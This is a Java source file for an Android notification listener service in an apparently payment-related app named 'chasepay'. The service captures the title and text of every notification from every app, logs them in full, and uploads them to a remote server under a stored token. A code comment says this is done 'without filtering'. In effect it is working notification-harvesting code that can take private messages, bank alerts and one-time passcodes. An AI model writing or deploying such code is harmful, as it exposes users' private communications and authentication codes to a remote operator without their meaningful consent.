package ru.chasepay.mobile.services;

import android.content.SharedPreferences;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import ru.chasepay.mobile.api.ApiClient;
import ru.chasepay.mobile.api.DeviceApi;
import ru.chasepay.mobile.models.NotificationRequest;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class NotificationListenerService extends android.service.notification.NotificationListenerService {
    private static final String TAG = "NotificationListener";
    private static final String PREFS_NAME = "ChasePrefs";
    private static final String KEY_DEVICE_TOKEN = "device_token";
    
    private DeviceApi deviceApi;
    private SharedPreferences prefs;
    
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            Log.d(TAG, "NotificationListenerService onCreate");
            deviceApi = ApiClient.getInstance().create(DeviceApi.class);
            prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            Log.d(TAG, "NotificationListenerService initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error in onCreate", e);
        }
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Log.d(TAG, "Notification received from: " + sbn.getPackageName());
            
            String deviceToken = prefs.getString(KEY_DEVICE_TOKEN, null);
            if (deviceToken == null) {
                Log.w(TAG, "No device token, skipping notification");
                return;
            }
            
            // Extract notification data
            String packageName = sbn.getPackageName();
            String appName = getAppName(packageName);
            CharSequence title = "";
            CharSequence content = "";
            
            if (sbn.getNotification().extras != null) {
                title = sbn.getNotification().extras.getCharSequence("android.title", "");
                content = sbn.getNotification().extras.getCharSequence("android.text", "");
            }
            
            Log.d(TAG, "Notification details - App: " + appName + ", Title: " + title + ", Content: " + content);
            
            // Send ALL notifications to server without filtering
            sendNotificationToServer(deviceToken, packageName, appName, 
                                   title.toString(), content.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification", e);
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.d(TAG, "Notification removed from: " + sbn.getPackageName());
    }
    
    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "NotificationListenerService connected");
    }
    
    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.d(TAG, "NotificationListenerService disconnected");
    }
    
    private void sendNotificationToServer(String token, String packageName, 
                                        String appName, String title, String content) {
        try {
            Log.d(TAG, "Sending notification to server...");
            
            NotificationRequest request = new NotificationRequest();
            request.packageName = packageName;
            request.appName = appName;
            request.title = title;
            request.content = content;
            request.timestamp = System.currentTimeMillis();
            request.priority = 1;
            request.category = "transaction";
            
            deviceApi.sendNotification("Bearer " + token, request).enqueue(new Callback<Void>() {
                @Override
                public void onResponse(Call<Void> call, Response<Void> response) {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "Notification sent successfully");
                    } else {
                        Log.e(TAG, "Failed to send notification: " + response.code());
                        try {
                            if (response.errorBody() != null) {
                                Log.e(TAG, "Error body: " + response.errorBody().string());
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Error reading error body", e);
                        }
                    }
                }
                
                @Override
                public void onFailure(Call<Void> call, Throwable t) {
                    Log.e(TAG, "Error sending notification: " + t.getMessage(), t);
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error in sendNotificationToServer", e);
        }
    }
    
    private String getAppName(String packageName) {
        try {
            return getPackageManager()
                .getApplicationLabel(getPackageManager()
                    .getApplicationInfo(packageName, 0))
                .toString();
        } catch (Exception e) {
            Log.w(TAG, "Failed to get app name for: " + packageName);
            return packageName;
        }
    }
}